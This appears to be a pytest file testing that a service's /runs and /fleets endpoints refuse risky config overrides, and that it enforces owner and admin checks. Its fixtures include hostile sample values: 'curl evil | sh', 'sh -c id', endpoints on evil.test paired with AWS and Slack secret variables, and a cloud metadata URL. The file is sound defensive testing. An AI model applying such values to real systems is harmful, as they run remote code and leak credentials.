"""Request overrides on /runs and /fleets may not start processes or widen tools,
and under strict auth only an admin or the exact owner may answer or cancel."""
from __future__ import annotations

import threading

import httpx
import pytest

from fabri.service.auth import sign_session
from fabri.service.http_server import refused_override_keys, serve_http
from fabri.service.service import FabriService

REFUSED = {
    "tools.sources": {"tools": {"sources": [{"kind": "http", "url": "http://10.0.0.1/"}]}},
    "tools.policy": {"tools": {"policy": {"allow_kinds": ["mcp"]}}},
    "tools.mcp_servers": {"tools": {"mcp_servers": [{"name": "x", "command": ["sh", "-c", "id"]}]}},
    "tools.manifest_dir": {"tools": {"manifest_dir": "/tmp/evil"}},
    "tools.sandbox_root": {"tools": {"sandbox_root": "/"}},
    "tools.agents": {"tools": {"agents": [{"name": "a", "description": "d", "config": "/etc/x.yaml"}]}},
    "tools.enabled": {"tools": {"enabled": None}},
    "agent.repair.verify_command": {"agent": {"repair": {"verify_command": "curl evil | sh"}}},
    "agent.repair.verify_cwd": {"agent": {"repair": {"verify_cwd": "/"}}},
}

ALLOWED = {
    "llm": {"model": "gemini-2.5-flash"},
    "memory": {"collection": "tenant-a"},
    "agent": {"max_cost_usd": 0.5, "max_steps": 3, "repair": {"enabled": True, "max_attempts": 1}},
    "tools": {
        "result_format": "json",
        "retrieval": {"enabled": True},
        "decompose": {"enabled": True},
        "ask_user": {"enabled": False},
    },
}


@pytest.fixture(autouse=True)
def clean_env(monkeypatch):
    for name in ("FABRI_ADMIN_TOKEN", "FABRI_SERVICE_TOKEN", "FABRI_AUTH_ALLOWED_EMAILS",
                 "FABRI_AUTH_ADMINS", "FABRI_AUTH_SIGNUP", "FABRI_AUTH_DB_PATH",
                 "FABRI_AUTH_ENABLED", "FABRI_AUTH_CONFIG"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("FABRI_AUTH_SECRET", "secret")


@pytest.fixture
def make_server(tmp_path):
    started = []

    def make(auth_body: str | None = None):
        kwargs = {}
        if auth_body is not None:
            path = tmp_path / "fabri-service.yaml"
            path.write_text(auth_body)
            kwargs["auth_config"] = path
        service = FabriService(home_root=tmp_path / "home", **kwargs)
        submitted = []
        service.submit = lambda task, overrides, **kw: submitted.append((task, overrides)) or "run-1"
        server = serve_http(service, port=0)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        started.append((server, service))
        return server, service, submitted

    yield make
    for server, service in started:
        server.shutdown()
        server.server_close()
        service.close()


def client(server, headers=None):
    # Studio's same-origin fetch sends Sec-Fetch-Site: same-origin.
    return httpx.Client(base_url=f"http://127.0.0.1:{server.server_address[1]}",
                        headers={"Sec-Fetch-Site": "same-origin", **(headers or {})})


@pytest.mark.parametrize("key", sorted(REFUSED))
def test_runs_refuses_each_key(make_server, key):
    server, _, submitted = make_server()
    resp = client(server).post("/runs", json={"task": "t", "overrides": REFUSED[key]})
    assert resp.status_code == 400
    assert key in resp.json()["error"]
    assert "widen tool access" in resp.json()["error"]
    assert submitted == []


@pytest.mark.parametrize("key", sorted(REFUSED))
def test_fleets_refuse_each_key_at_both_levels(make_server, key):
    server, service, _ = make_server()
    fleets = []
    service.submit_fleet = lambda items, overrides, **kw: fleets.append(items) or {"fleet_id": "f"}
    c = client(server)
    top = c.post("/fleets", json={"items": [{"task": "t"}], "overrides": REFUSED[key]})
    assert top.status_code == 400
    assert key in top.json()["error"]
    item = c.post("/fleets", json={"items": [{"task": "a"}, {"task": "b", "overrides": REFUSED[key]}]})
    assert item.status_code == 400
    assert "items[1].overrides" in item.json()["error"]
    assert key in item.json()["error"]
    assert fleets == []


def test_refused_keys_lists_every_hit_and_ignores_non_mappings():
    every = {
        "tools": {k.split(".", 1)[1]: None for k in REFUSED if k.startswith("tools.")},
        "agent": {"repair": {"verify_command": None, "verify_cwd": None}},
    }
    assert sorted(refused_override_keys(every)) == sorted(REFUSED)
    assert refused_override_keys(None) == []
    assert refused_override_keys(ALLOWED) == []
    assert refused_override_keys({"tools": "x", "agent": {"repair": "y"}}) == []


# Overrides that would send a provider key somewhere new, read a different
# environment variable as the key, or point the run at a new address or file.
REDIRECTS = {
    "llm.base_url": {"llm": {"base_url": "https://evil.test/v1", "api_key_env": "AWS_SECRET_ACCESS_KEY"}},
    "llm.planner.api_key_env": {"llm": {"planner": {"provider": "openai", "api_key_env": "SLACK_BOT_TOKEN"}}},
    "memory.qdrant_url": {"memory": {"qdrant_url": "http://169.254.169.254/"}},
    "observability.otlp_endpoint": {"observability": {"otlp_endpoint": "https://evil.test/v1/traces"}},
    # llm.roles is the normalized alias the loader builds from the role blocks.
    "llm.roles.main.base_url": {"llm": {"roles": {"main": {"base_url": "https://evil.test/v1"}}}},
}


@pytest.mark.parametrize("key", sorted(REDIRECTS))
def test_runs_and_fleets_refuse_key_redirects(make_server, key):
    server, service, submitted = make_server()
    fleets = []
    service.submit_fleet = lambda items, overrides, **kw: fleets.append(items) or {"fleet_id": "f"}
    c = client(server)
    run = c.post("/runs", json={"task": "t", "overrides": REDIRECTS[key]})
    assert run.status_code == 400
    assert key in run.json()["error"]
    top = c.post("/fleets", json={"items": [{"task": "t"}], "overrides": REDIRECTS[key]})
    assert top.status_code == 400
    item = c.post("/fleets", json={"items": [{"task": "t", "overrides": REDIRECTS[key]}]})
    assert item.status_code == 400
    assert "items[0].overrides" in item.json()["error"]
    assert submitted == [] and fleets == []


def test_refused_key_names_match_at_any_depth():
    assert refused_override_keys({"llm": {"base_url": "x", "api_key_env": "Y"}}) == [
        "llm.base_url", "llm.api_key_env"]
    assert refused_override_keys({"llm": {"narrator": {"api_base": "x", "api_key": "k"}}}) == [
        "llm.narrator.api_base", "llm.narrator.api_key"]
    assert refused_override_keys({"agent": {"extra": [{"socket_path": "/tmp/s"}]}}) == [
        "agent.extra[0].socket_path"]
    assert refused_override_keys({"x": {"some_dir": 1, "a_command": 2, "b_endpoint": 3}}) == [
        "x.some_dir", "x.a_command", "x.b_endpoint"]
    # A whole section counts even when empty or null.
    assert refused_override_keys({"memory": {}}) == ["memory"]
    assert refused_override_keys({"observability": None}) == ["observability"]
    assert refused_override_keys({"memory": {"collection": "tenant-a"}}) == []
    for bad in ("../x", "a b", "", "x" * 65, 5, None, ["a"]):
        assert refused_override_keys({"memory": {"collection": bad}}) == ["memory.collection"]
    assert refused_override_keys({"memory": {"collection": "ok", "qdrant_url": "u"}}) == [
        "memory.qdrant_url"]
    # A key hit by two rules is named once.
    assert refused_override_keys({"tools": {"manifest_dir": "/x"}}) == ["tools.manifest_dir"]
    # Role model and provider changes stay allowed.
    assert refused_override_keys(
        {"llm": {"provider": "anthropic", "model": "m", "planner": {"model": "p"}, "narrator": None}}
    ) == []


def test_runs_and_fleets_accept_harmless_overrides(make_server):
    server, service, submitted = make_server()
    fleets = []
    service.submit_fleet = lambda items, overrides, **kw: fleets.append(overrides) or {"fleet_id": "f"}
    c = client(server)
    assert c.post("/runs", json={"task": "t", "overrides": ALLOWED}).status_code == 200
    assert submitted == [("t", ALLOWED)]
    resp = c.post("/fleets", json={"items": [{"task": "t", "overrides": ALLOWED}], "overrides": ALLOWED})
    assert resp.status_code == 200
    assert fleets == [ALLOWED]


def test_refusal_happens_before_the_real_submit_binds_a_config(tmp_path):
    service = FabriService(home_root=tmp_path / "home")
    server = serve_http(service, port=0)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        resp = client(server).post(
            "/runs", json={"task": "t", "overrides": REFUSED["tools.mcp_servers"]})
        assert resp.status_code == 400
        assert list((tmp_path / "home").rglob("run.yaml")) == []
    finally:
        server.shutdown()
        server.server_close()
        service.close()


BOSS, DEV = "boss@x.test", "dev@x.test"
INVITE_ONLY = f"""auth:
  enabled: true
  secure_cookie: false
  signup: true
  admins: [{BOSS}]
  allowed_emails: [{BOSS}, {DEV}]
"""


def session(service, email):
    users = service.user_store
    user_id = users.verify_user(email, "password-1") or users.create_user(email, "password-1")
    return {"Cookie": f"fabri_session={sign_session(user_id, 'secret', 60)}"}


def test_service_token_cannot_answer_or_cancel_an_unowned_run(make_server, monkeypatch):
    monkeypatch.setenv("FABRI_ADMIN_TOKEN", "adm")
    monkeypatch.setenv("FABRI_SERVICE_TOKEN", "svc")
    server, service, _ = make_server(INVITE_ONLY)
    answered, cancelled = [], []
    service.answer = lambda sid, qid, ans, opt=None: answered.append(sid)
    service.cancel = lambda sid: cancelled.append(sid) or {"status": "cancelled"}
    service.result = lambda sid, **_: {"session_id": sid}
    service.run_owner = lambda sid: None
    body = {"question_id": "q1", "answer": "approve"}
    svc = client(server, {"Authorization": "Bearer svc"})
    adm = client(server, {"Authorization": "Bearer adm"})

    assert svc.post("/runs/orphan/answer", json=body).status_code == 404
    assert svc.post("/runs/orphan/cancel").status_code == 403
    assert answered == [] and cancelled == []
    # Reads keep working for the read-only token.
    assert svc.get("/runs/orphan/result").json() == {"session_id": "orphan"}
    # The admin branch is unchanged.
    assert adm.post("/runs/orphan/answer", json=body).status_code == 200
    assert adm.post("/runs/orphan/cancel").status_code == 200
    assert answered == ["orphan"] and cancelled == ["orphan"]


def test_signed_in_user_cannot_answer_an_unowned_run(make_server, monkeypatch):
    server, service, _ = make_server(INVITE_ONLY)
    answered = []
    service.answer = lambda sid, qid, ans, opt=None: answered.append(sid)
    dev_headers = session(service, DEV)
    dev_id = service.user_store.verify_user(DEV, "password-1")
    owners = {"mine": dev_id, "orphan": None}
    service.run_owner = lambda sid: owners.get(sid)
    dev = client(server, dev_headers)
    body = {"question_id": "q1", "answer": "approve"}
    assert dev.post("/runs/orphan/answer", json=body).status_code == 404
    assert dev.post("/runs/mine/answer", json=body).status_code == 200
    assert answered == ["mine"]


def test_admin_user_cancels_any_run(make_server, monkeypatch):
    server, service, _ = make_server(INVITE_ONLY)
    cancelled = []
    service.cancel = lambda sid: cancelled.append(sid) or {"status": "cancelled"}
    service.run_owner = lambda sid: {"theirs": "someone-else"}.get(sid)
    boss = client(server, session(service, BOSS))
    assert boss.post("/runs/theirs/cancel").status_code == 200
    assert boss.post("/runs/orphan/cancel").status_code == 200
    assert cancelled == ["theirs", "orphan"]


def test_stdio_refuses_a_job_with_refused_overrides_and_runs_the_next(tmp_path):
    import io
    import json

    submitted = []

    class Fake:
        def submit(self, task, overrides):
            submitted.append((task, overrides))
            return "sid"

        def stream(self, session_id):
            return iter(())

        def result(self, session_id):
            return {"ok": True}

    from fabri.service.service import serve_stdio

    bad = {"task": "a", "overrides": REDIRECTS["llm.base_url"]}
    good = {"task": "b", "overrides": ALLOWED}
    stdin = io.StringIO(json.dumps(bad) + "\n" + json.dumps(good) + "\n")
    stdout = io.StringIO()
    serve_stdio(Fake(), stdin=stdin, stdout=stdout)
    lines = [json.loads(line) for line in stdout.getvalue().splitlines()]
    assert "llm.base_url" in lines[0]["error"] and "llm.api_key_env" in lines[0]["error"]
    assert lines[1]["status"] == "submitted"
    assert submitted == [("b", ALLOWED)]


# Overrides that would pick which stored credential or connection a run uses, or
# widen what its policy grants. Matched by name at any depth, plus any _ref name.
CREDENTIAL_OVERRIDES = {
    "agent.secret_ref": {"agent": {"secret_ref": "slack:globex"}},
    "tools.retrieval.credential_grants": {"tools": {"retrieval": {"credential_grants": {"*": ["*"]}}}},
    "llm.header_source": {"llm": {"header_source": "slack:globex"}},
    "agent.extra[0].my_ref": {"agent": {"extra": [{"my_ref": "linear:globex"}]}},
}


@pytest.mark.parametrize("key", sorted(CREDENTIAL_OVERRIDES))
def test_runs_and_fleets_refuse_credential_names(make_server, key):
    server, service, submitted = make_server()
    fleets = []
    service.submit_fleet = lambda items, overrides, **kw: fleets.append(items) or {"fleet_id": "f"}
    c = client(server)
    run = c.post("/runs", json={"task": "t", "overrides": CREDENTIAL_OVERRIDES[key]})
    assert run.status_code == 400
    assert key in run.json()["error"]
    top = c.post("/fleets", json={"items": [{"task": "t"}], "overrides": CREDENTIAL_OVERRIDES[key]})
    assert top.status_code == 400
    assert key in top.json()["error"]
    item = c.post("/fleets", json={"items": [{"task": "t", "overrides": CREDENTIAL_OVERRIDES[key]}]})
    assert item.status_code == 400
    assert "items[0].overrides" in item.json()["error"]
    assert submitted == [] and fleets == []


def test_refused_credential_names_match_at_any_depth_and_any_case():
    assert refused_override_keys({"a": {"Secret_Ref": "x", "CREDENTIAL_GRANTS": {}}}) == [
        "a.Secret_Ref", "a.CREDENTIAL_GRANTS"]
    assert refused_override_keys({"x": [{"y": {"header_source": None}}]}) == ["x[0].y.header_source"]
    assert refused_override_keys({"llm": {"token_ref": "", "planner": {"key_ref": None}}}) == [
        "llm.token_ref", "llm.planner.key_ref"]
    # A name that only contains "ref" is not refused.
    assert refused_override_keys({"agent": {"prefer": 1, "refresh": True, "ref": "x"}}) == []


def test_collection_with_trailing_newline_is_refused():
    from fabri.service.binding import refused_override_keys
    assert refused_override_keys({"memory": {"collection": "tenant-a\n"}})
    assert not refused_override_keys({"memory": {"collection": "tenant-a"}})


def test_stdio_rejects_non_object_jobs_and_overrides():
    import io, json
    from fabri.service.service import serve_stdio

    class _Svc:
        def submit(self, *a, **k):
            raise AssertionError("must not submit")

    out = io.StringIO()
    serve_stdio(_Svc(), stdin=io.StringIO('[1,2]\n"x"\n{"task":"t","overrides":[1]}\n'), stdout=out)
    lines = [json.loads(x) for x in out.getvalue().splitlines()]
    assert [l["error"] for l in lines] == ["request must be a JSON object", "request must be a JSON object",
                                          "overrides must be a JSON object"]
